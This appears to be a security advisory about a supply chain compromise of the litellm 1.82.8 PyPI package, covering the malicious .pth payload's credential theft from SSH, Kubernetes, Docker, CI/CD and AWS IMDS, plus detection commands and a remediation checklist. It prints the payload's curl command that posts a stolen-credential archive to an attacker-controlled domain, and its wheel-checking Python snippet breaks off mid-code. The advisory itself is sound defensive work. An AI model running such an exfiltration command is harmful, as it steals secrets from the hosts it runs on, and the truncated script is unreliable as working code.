⚠️ litellm 1.82.8 Supply Chain Attack

AWS Impact Advisory & Environment Scanner


CRITICAL Discovered: 2026-03-24 Issue: Open

If litellm==1.82.8 was installed in any environment with AWS credentials — local machine, EC2, ECS, Lambda, CodeBuild, or CI/CD — rotate all AWS credentials immediately and audit CloudTrail for unauthorized activity since 2026-03-24.

Overview

The litellm==1.82.8 wheel package published to PyPI contains a malicious litellm_init.pth file (34,628 bytes). Python automatically executes .pth files in site-packages/ on every interpreter startup — no import litellm required. The payload is double base64-encoded, collects credentials from the host, encrypts them with AES-256 + RSA-4096, and exfiltrates to an attacker-controlled domain.

This is a supply chain compromise. The malicious file is listed in the package's own RECORD: 

litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628

Malicious Behavior

🔍 Stage 1 — Data Collection

The payload collects the following from the infected host:

SSHid_rsa, id_ed25519, id_ecdsa, authorized_keys, known_hosts, config
Kubernetes~/.kube/config, /etc/kubernetes/*.conf, service account tokens

Docker~/.docker/config.json, /kaniko/.docker/config.json

CI/CDterraform.tfvars, .gitlab-ci.yml, .travis.yml, Jenkinsfile
Crypto walletsBitcoin, Ethereum, Solana, Monero, and others
WebhooksSlack/Discord webhook URLs grepped from env and config files
🔐 Stage 2 — Encryption & Exfiltration
  1. Collected data written to a temp file
  2. Random 32-byte AES-256 session key generated via openssl rand
  3. Data encrypted with openssl enc -aes-256-cbc -pbkdf2
  4. AES key encrypted with a hardcoded 4096-bit RSA public key (OAEP padding)
  5. Both files packed into tpcp.tar.gz
  6. Archive exfiltrated:
curl -s -o /dev/null -X POST \
  "https://models.litellm.cloud/" \
  -H "Content-Type: application/octet-stream" \
  -H "X-Filename: tpcp.tar.gz" \
  --data-binary @tpcp.tar.gz

Stealth note: The payload is double base64-encoded, making it invisible to naive source code grep. The trigger mechanism (.pth files) requires no import statement.

AWS Impact

This attack is not limited to local developer machines. Any environment where Python runs with AWS credentials present is at risk.

IMDS note: The malware explicitly fetches the IMDS token and then calls http://169.254.169.254/latest/meta-data/iam/security-credentials/. IMDSv2 is not a mitigation — the malware fetches the token first.

💥 What an Attacker Can Do with Stolen AWS Credentials

Impact depends on the permissions of the stolen identity, but common attack patterns include:

  • Crypto mining — spin up EC2/ECS at scale (most common immediate use)
  • Data exfiltration — read S3 buckets, DynamoDB, Secrets Manager, Parameter Store
  • Privilege escalation — if the role has iam:* or sts:AssumeRole, pivot to higher-privilege roles
  • Persistence — create new IAM users/access keys, add backdoor roles
  • Lateral movement — assume roles in other accounts via cross-account trust
  • Bedrock abuse — run up inference costs if the role has Bedrock access

Detection

🔎 Check for the Malicious File 
# Linux / macOS / container
find / -name "litellm_init.pth" 2>/dev/null

# Windows
dir /s /b "%USERPROFILE%\litellm_init.pth" 2>nul
dir /s /b "C:\Python*\Lib\site-packages\litellm_init.pth" 2>nul
🔎 Verify the PyPI Wheel 
pip download litellm==1.82.8 --no-deps -d /tmp/check
python3 -c "
import zipfile, os
whl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0]
with zipfile.ZipFile(whl) as z:

🔎 Check GuardDuty for Credential Exfiltration Findings 
DETECTOR=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)
aws guardduty list-findings \
  --detector-id $DETECTOR \
  --finding-criteria '{
    "Criterion": {
      "type": {"Eq": [
        "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS",
        "CredentialAccess:IAMUser/AnomalousBehavior"
      ]},
      "updatedAt": {"Gte": 1742774400000}
    }
  }'

The finding type UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS fires when IMDS credentials are used from an external IP — the fastest signal for EC2/container compromise.

Remediation Checklist

If litellm==1.82.8 was installed in any environment:

✅ Immediate Actions
  • Remove litellm==1.82.8 — pip uninstall litellm
  • Delete litellm_init.pth from site-packages/ if present
  • Rotate ALL IAM access keys (IAM console → Users → Security credentials)
  • Rotate all secrets present as environment variables on affected systems
  • Rotate SSH keys
  • Block models.litellm.cloud at network/firewall/DNS level
  • Check for new IAM users, roles, or access keys created after 2026-03-24
  • Review CloudTrail for unusual API calls from unexpected IPs or regions
  • Rebuild any Docker/container images that included this version
  • Audit CI/CD pipelines for litellm==1.82.8 in buildspecs or requirements files
🛡️ Prevention Going Forward
  • Pin exact package versions in requirements.txt and verify hashes: pip hash
  • Use a private PyPI mirror (AWS CodeArtifact) to vet packages before use
  • Enforce IMDSv2 only: HttpTokens: required in EC2 instance metadata options
  • Apply least-privilege to all IAM roles — no iam:* on compute roles
  • Enable GuardDuty in all accounts and regions
  • Enable AWS Config for continuous compliance monitoring
  • Scan container images in ECR with Amazon Inspector
  • Use AWS CodeArtifact as a package proxy with upstream blocking
